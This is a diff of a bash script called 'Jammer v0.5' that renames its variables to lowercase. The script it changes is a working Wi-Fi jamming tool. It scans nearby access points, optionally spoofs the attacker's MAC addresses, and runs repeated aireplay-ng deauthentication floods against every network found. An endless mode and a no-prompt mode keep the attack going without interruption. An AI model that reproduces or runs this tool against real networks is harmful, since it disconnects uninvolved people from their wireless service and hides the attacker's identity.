@@ -9,40 +9,40 @@
 # SOFTWARE
 
 # Current Version
-VERSION="v0.5"
+version="v0.5"
 
 # Variable and static names for Wireless interface
-W_INT="wlan0"
-W_INT_STATIC="wlan0"
+wint="wlan0"
+wint_static="wlan0"
 
 # Variable and static names for Ethernet interface
-E_INT="eth0"
-E_INT_STATIC="eth0"
+eint="eth0"
+eint_static="eth0"
 
 
 # base name for scan files
-NAME=jam_scan
+name=jam_scan
 
 # regex for is-number check
 re='^[0-9]+$'
 
 # default DeAuth times for each MAC address
-DE_AUTH_NUMBER=10
+deauth_number=10
 
 # try to change macs with macchanger
-CHANGE_MACS=0
+change_macs=0
 
 # yes to all variable
-YES_TO_ALL=0
+yes_to_all=0
 
 # if 1, do not delete the files at the end
-KEEP_SCAN_FILES=0
+keep_scan_files=0
 
 # decide if the program is an endless loop
-ENDLESS=0
+endless=0
 
 # an array of files to white-list
-WHITE_LIST=
+white_list=
 
 # some colors
 RED='\e[0;31m'
@@ -52,12 +52,12 @@ BOLD='\e[1m'
 NC='\e[0m'
 
 # prompt
-PROMPT="${BOLD}jam!${NC} "
+prompt="${BOLD}jam!${NC} "
 
 # check for the right permissions
 check_perm() {
     if (( EUID != 0 )); then
-      echo -e "${PROMPT}${RED}Re-run the script, this time with root privileges.${NC}"
+      echo -e "${prompt}${RED}Re-run the script, this time with root privileges.${NC}"
       exit 0
     fi
 }
@@ -72,13 +72,13 @@ check_dep() {
          exit 0
       fi
     done
-    echo -e "${PROMPT}${GREEN}All dependencies are met, moving on.${NC}"
+    echo -e "${prompt}${GREEN}All dependencies are met, moving on.${NC}"
 }
 
 # check if argument is number
 check_number() {
     if [[ ! ($1 =~ $re) ]]; then
-        echo -e "${PROMPT}${RED}Wrong argument format. Exiting.${NC}"
+        echo -e "${prompt}${RED}Wrong argument format. Exiting.${NC}"
         exit 0
     fi
     return 1
@@ -101,65 +101,65 @@ array_contains_element() {
 # change the MACs of the machine
 change_macs() {
     # Change mac address for Ethernet interface
-    printf "${PROMPT}Changing MAC for Ethernet Interface\n"
-    macchanger -A $E_INT
+    printf "${prompt}Changing MAC for Ethernet Interface\n"
+    macchanger -A $eint
     # Change mac address and initiate monitor mode
-    printf "${PROMPT}Changing MAC for Wireless Interface\n"
-    ifconfig $W_INT down
+    printf "${prompt}Changing MAC for Wireless Interface\n"
+    ifconfig $wint down
     sleep 1
-    macchanger -A $W_INT
+    macchanger -A $wint
     # Set wlan to monitor mode
     sleep 1
-    iwconfig $W_INT mode Monitor
+    iwconfig $wint mode Monitor
     sleep 1
-    ifconfig $W_INT up
+    ifconfig $wint up
 }
 
 # reset the MACs and settings and remove files created
 cleanup_and_reset() {
-    if [[ $CHANGE_MACS -eq 1 ]]; then
-        printf "${PROMPT}Reseting the default MAC for Ethernet Interface\n"
-        macchanger -p $E_INT
-        printf "${PROMPT}Reseting the default MAC for Wireless Interface\n"
-        ifconfig $W_INT down
+    if [[ $change_macs -eq 1 ]]; then
+        printf "${prompt}Reseting the default MAC for Ethernet Interface\n"
+        macchanger -p $eint
+        printf "${prompt}Reseting the default MAC for Wireless Interface\n"
+        ifconfig $wint down
         sleep 1
-        macchanger -p $W_INT
+        macchanger -p $wint
         sleep 1
-        iwconfig $W_INT mode Managed
+        iwconfig $wint mode Managed
         sleep 1
-        ifconfig $W_INT up
+        ifconfig $wint up
     fi
-    if [[ KEEP_SCAN_FILES -eq 0 ]]; then
-        printf "${PROMPT}Cleaning up the created files . . .\n"
-        rm -f ${NAME}_out.txt
-        rm -f $NAME-01.csv
-        rm -f $NAME-01.cap
-        rm -f $NAME-01.kismet.csv
-        rm -f $NAME-01.kismet.netxml
+    if [[ keep_scan_files -eq 0 ]]; then
+        printf "${prompt}Cleaning up the created files . . .\n"
+        rm -f ${name}_out.txt
+        rm -f $name-01.csv
+        rm -f $name-01.cap
+        rm -f $name-01.kismet.csv
+        rm -f $name-01.kismet.netxml
     fi
-    printf "${PROMPT}Done. Exiting.\n"
+    printf "${prompt}Done. Exiting.\n"
 }
 
 # a warning before the attack starts
 warn_before() {
-    printf "${PROMPT}${GREEN}DONE FINDING TARGETS${NC}\n"
-    printf "${PROMPT}${RED}THE ATTACK WILL START IN 5 SECONDS${NC}\n"
-    printf "${PROMPT}${GREEN}IF YOU WANT TO ABORT DO IT NOW${NC}\n"
+    printf "${prompt}${GREEN}DONE FINDING TARGETS${NC}\n"
+    printf "${prompt}${RED}THE ATTACK WILL START IN 5 SECONDS${NC}\n"
+    printf "${prompt}${GREEN}IF YOU WANT TO ABORT DO IT NOW${NC}\n"
     sleep 5
 }
 
 # a warning about the interfaces
 warn_about_interface() {
-    printf "${PROMPT}${BROWN}One or more of the interfaces have not been changed\n${NC}"
-    printf "${PROMPT}${BROWN}The detected interfaces are: \n${NC}"
+    printf "${prompt}${BROWN}One or more of the interfaces have not been changed\n${NC}"
+    printf "${prompt}${BROWN}The detected interfaces are: \n${NC}"
     ls /sys/class/net/ | awk '{print "     ",$1}'
-    printf "${PROMPT}${BROWN}The defaults are${NC} $W_INT${BROWN} and ${NC}$E_INT\n"
-    printf "${PROMPT}${BROWN}If they do not match, cancel the scan and use -e and -w to set them\n${NC}"
-    if [[ YES_TO_ALL -eq 0 ]]; then
-        printf "${PROMPT}${BROWN}Waiting 8 seconds to make up your mind${NC}\n"
+    printf "${prompt}${BROWN}The defaults are${NC} $wint${BROWN} and ${NC}$eint\n"
+    printf "${prompt}${BROWN}If they do not match, cancel the scan and use -e and -w to set them\n${NC}"
+    if [[ yes_to_all -eq 0 ]]; then
+        printf "${prompt}${BROWN}Waiting 8 seconds to make up your mind${NC}\n"
         sleep 8
     fi
-    printf "${PROMPT}${BROWN}Continuing ...${NC}\n"
+    printf "${prompt}${BROWN}Continuing ...${NC}\n"
 }
 
 # prints the help message
@@ -194,15 +194,15 @@ show_help() {
 
 
 scan_area() {
-    if iwlist $W_INT scanning |
+    if iwlist $wint scanning |
         while IFS= read -r line; do
             [[ "$line" =~ Address ]] && bssid=${line##*ss: }
             [[ "$line" =~ \(Channel ]] && { channel=${line##*nel }; channel=${channel:0:$((${#channel}-1))}; }
             [[ "$line" =~ ESSID ]] && {
                 essid=${line##*ID:}
-                #array_contains_element $WHITE_LIST $essid == 0 && echo "${bssid};${channel};${essid}"
+                #array_contains_element $white_list $essid == 0 && echo "${bssid};${channel};${essid}"
                 found=0
-                for element in "${WHITE_LIST[@]}"; do
+                for element in "${white_list[@]}"; do
                     element=$( echo "${element}" | sed -e 's/^ *//' -e 's/ *$//' );
                     if [[ $element == $essid ]]; then
                         found=1
@@ -213,7 +213,7 @@ scan_area() {
                     echo "${bssid};${channel};${essid}"
                 fi
             }
-        done > ${NAME}_out.txt ;
+        done > ${name}_out.txt ;
     then
         echo "Something went wrong, retrying"
         sleep 5
@@ -226,10 +226,10 @@ deauth() {
     local bssid="$2"
     local channel="$3"
     if [[ "$channel" =~ $re ]]; then
-        echo -e ${PROMPT}Targeting:${RED} "$essid" ${NC} with BSSID: "$bssid" @ ${GREEN}Channel "$channel" ${NC}
+        echo -e ${prompt}Targeting:${RED} "$essid" ${NC} with BSSID: "$bssid" @ ${GREEN}Channel "$channel" ${NC}
         sleep 3
-        iwconfig $W_INT channel "$channel"
-        aireplay-ng -0 $DE_AUTH_NUMBER -a "$bssid" $W_INT
+        iwconfig $wint channel "$channel"
+        aireplay-ng -0 $deauth_number -a "$bssid" $wint
     fi
 }
 
@@ -240,13 +240,13 @@ read_file_and_deauth() {
     do
         read bssid channel essid <<< $(echo $line | awk -F";" '{print $1 " " $2 " " $3}')
         deauth "$essid" "$bssid" "$channel"
-    done < ${NAME}_out.txt
+    done < ${name}_out.txt
 }
 
-# starts attack, if ENDLESS is 1, goes on forever
+# starts attack, if endless is 1, goes on forever
 main_attack() {
     read_file_and_deauth
-    if [[ ENDLESS -eq 1 ]]; then
+    if [[ endless -eq 1 ]]; then
         main_attack
     else exit 0
     fi
@@ -255,14 +255,14 @@ main_attack() {
 
 # a fucntion to print the detected stations from the file
 show_detected_stations() {
-    printf "${PROMPT}Detected Stations are:\n"
-    awk -F";" '{print NR,$3}' ${NAME}_out.txt
+    printf "${prompt}Detected Stations are:\n"
+    awk -F";" '{print NR,$3}' ${name}_out.txt
     printf "\n\n"
 }
 
 
 echo
-echo "Jammer $VERSION"
+echo "Jammer $version"
 echo
 
 
@@ -272,45 +272,45 @@ do
 key="$1"
 case $key in
     -d|--deauths)
-        DE_AUTH_NUMBER="$2"
-        check_number $DE_AUTH_NUMBER
-        echo -e "${PROMPT}${GREEN}Setting deauth number to $DE_AUTH_NUMBER ${NC}"
+        deauth_number="$2"
+        check_number $deauth_number
+        echo -e "${prompt}${GREEN}Setting deauth number to $deauth_number ${NC}"
         shift
     ;;
     --spoof-mac)
-        CHANGE_MACS=1
-        echo -e "${PROMPT}${GREEN}I will try to change your macs${NC}"
+        change_macs=1
+        echo -e "${prompt}${GREEN}I will try to change your macs${NC}"
     ;;
     -y|--yes)
-        YES_TO_ALL=1
-        echo -e "${PROMPT}${GREEN}Setting YES as the answer to all${NC}"
+        yes_to_all=1
+        echo -e "${prompt}${GREEN}Setting YES as the answer to all${NC}"
     ;;
     -s|--endless)
-        ENDLESS=1
-        echo -e "${PROMPT}${GREEN}Setting mode to Endless${NC}"
+        endless=1
+        echo -e "${prompt}${GREEN}Setting mode to Endless${NC}"
     ;;
     -f|--whitelist)
-        readarray WHITE_LIST < "$2"
-        echo -e "${PROMPT}${GREEN}Trying to whitelist the ESSID's in the file $2 ${NC}"
+        readarray white_list < "$2"
+        echo -e "${prompt}${GREEN}Trying to whitelist the ESSID's in the file $2 ${NC}"
         shift
     ;;
     -k|--keep)
-        KEEP_SCAN_FILES=1
-        echo -e "${PROMPT}${GREEN}Scan files will be kept${NC}"
+        keep_scan_files=1
+        echo -e "${prompt}${GREEN}Scan files will be kept${NC}"
     ;;
     -n|--name)
-        NAME="$2"
-        echo -e "${PROMPT}${GREEN}Setting scan file names to $NAME ${NC}"
+        name="$2"
+        echo -e "${prompt}${GREEN}Setting scan file names to $name ${NC}"
         shift
     ;;
     -e|--ethernet)
-        E_INT="$2"
-        echo -e "${PROMPT}${GREEN}Setting ethernet interface name to $E_INT ${NC}"
+        eint="$2"
+        echo -e "${prompt}${GREEN}Setting ethernet interface name to $eint ${NC}"
         shift
     ;;
     -w|--wireless)
-        W_INT="$2"
-        echo -e "${PROMPT}${GREEN}Setting wireless interface name to $W_INT ${NC}"
+        wint="$2"
+        echo -e "${prompt}${GREEN}Setting wireless interface name to $wint ${NC}"
         shift
     ;;
     -h|--help)
@@ -318,7 +318,7 @@ case $key in
         exit 0
     ;;
     *)
-        echo -e "${PROMPT}${RED}Unknown option, exiting.${NC}"
+        echo -e "${prompt}${RED}Unknown option, exiting.${NC}"
         exit 0
     ;;
 esac
@@ -334,7 +334,7 @@ check_perm
 check_dep
 
 # if the default interfaces have not changed, warn the user
-if [[ "$E_INT" == "$E_INT_STATIC" ]] || [[ "$W_INT" == "$W_INT_STATIC" ]]; then
+if [[ "$eint" == "$eint_static" ]] || [[ "$wint" == "$wint_static" ]]; then
     warn_about_interface
 fi
 
@@ -345,34 +345,34 @@ trap cleanup_and_reset EXIT
 cd "$(dirname "$0")"
 
 # show the station names you want to filter out
-if [ ${#WHITE_LIST[@]} -ne 0 ]; then
-    echo -e "${PROMPT}Whitelisted stations: ${NC}"
-    echo "${WHITE_LIST[@]}" | sed -e 's/^ *//' -e 's/ *$//'
+if [ ${#white_list[@]} -ne 0 ]; then
+    echo -e "${prompt}Whitelisted stations: ${NC}"
+    echo "${white_list[@]}" | sed -e 's/^ *//' -e 's/ *$//'
 fi
 
 
 # execute scan and save the discovered MAC addresses and channels to a file
-printf "${PROMPT}${GREEN}Scanning the area for active stations${NC}\n"
+printf "${prompt}${GREEN}Scanning the area for active stations${NC}\n"
 scan_area
 
-if [[ $CHANGE_MACS -eq 1 ]]; then
+if [[ $change_macs -eq 1 ]]; then
   change_macs
 fi
 
 show_detected_stations
 
 # check if the user wants no interaction
-if [[ $YES_TO_ALL -eq 1 ]]; then
+if [[ $yes_to_all -eq 1 ]]; then
     main_attack
     exit 0
 fi
 
 # else ask the user
-printf "${PROMPT}Scan is completed. Start jamming? [Y/n] "
+printf "${prompt}Scan is completed. Start jamming? [Y/n] "
 read answer_start
 case $answer_start in
         [Nn] | [Nn][Oo] )
-            printf "${PROMPT}${RED}Aborted.\n${NC}"
+            printf "${prompt}${RED}Aborted.\n${NC}"
             exit 0
         ;;
         *)
